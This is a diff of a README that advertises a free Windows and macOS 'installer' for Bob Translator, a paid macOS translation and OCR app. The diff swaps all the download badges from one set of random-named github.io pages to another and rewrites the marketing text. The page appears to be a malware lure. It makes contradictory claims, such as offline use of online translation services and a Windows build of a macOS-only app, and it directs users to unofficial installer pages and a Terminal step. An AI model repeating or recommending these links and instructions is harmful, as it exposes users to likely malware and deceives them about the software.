@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Translation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Bob Translator Free Installer** — Bob is a macOS translation and OCR application that translates selected text, screenshots, or clipboard content using multiple translation services simultaneously. Works without internet access, no account required. Full offline installation.
+**💻 Bob Translator Free Installer** — Bob is a macOS translation and OCR app that translates selected text or screenshots through multiple translation services simultaneously. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Bob Translator](https://img.shields.io/badge/⬇_Install_Bob+Translator-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Bob Translator](https://img.shields.io/badge/⬇_Install_Bob+Translator-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Bob Translator
 
-Bob is a macOS translation and OCR application that translates selected text, screenshots, or clipboard content using multiple translation services simultaneously. With a single shortcut, Bob captures text from anywhere on screen using OCR and provides translations from Google, DeepL, Youdao, and others side-by-side for comparison. Popular among macOS users reading foreign language content.
+Bob is a macOS translation and OCR app that translates selected text or screenshots through multiple translation services simultaneously. It displays translations from different services side by side for comparison in a clean popover interface.
 
 ---
 
 ## ❌ Problem: Bob Translator is hard to access
 
-- **macOS Only** — No Windows or cross-platform version
-- **API Configuration** — Optimal performance requires configuring multiple API keys
-- **Internet Required** — Translation requires active internet connection
-- **Privacy** — OCR captures screen content which is sent to translation services
+- **macOS Only** — No Windows or Linux version
+- **Paid App** — Requires purchase from Mac App Store
+- **API Setup** — Using premium translation services requires individual API key configuration
+- **Privacy** — Text sent to external translation APIs for processing
 
 ---
 
@@ -61,9 +61,9 @@ Bob is a macOS translation and OCR application that translates selected text, sc
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Bob is a macOS translation and OCR application that translates selected text, sc
 
 <div align="center">
 
-[![⬇ Install Bob Translator](https://img.shields.io/badge/⬇_Install_Bob+Translator-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Bob Translator](https://img.shields.io/badge/⬇_Install_Bob+Translator-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Bob is a macOS translation and OCR application that translates selected text, sc
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Bob is a macOS translation and OCR application that translates selected text, sc
 
 ---
 
-**Bob Translator Free Installer** — Bob is a macOS translation and OCR application that translates selected text, screenshots, or clipboard content using multiple translation services simultaneously. Install without internet connection today!
+**Bob Translator Free Installer** — Bob is a macOS translation and OCR app that translates selected text or screenshots through multiple translation services simultaneously. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Bob Translator](https://img.shields.io/badge/⬇_Install_Bob+Translator-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Bob Translator](https://img.shields.io/badge/⬇_Install_Bob+Translator-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
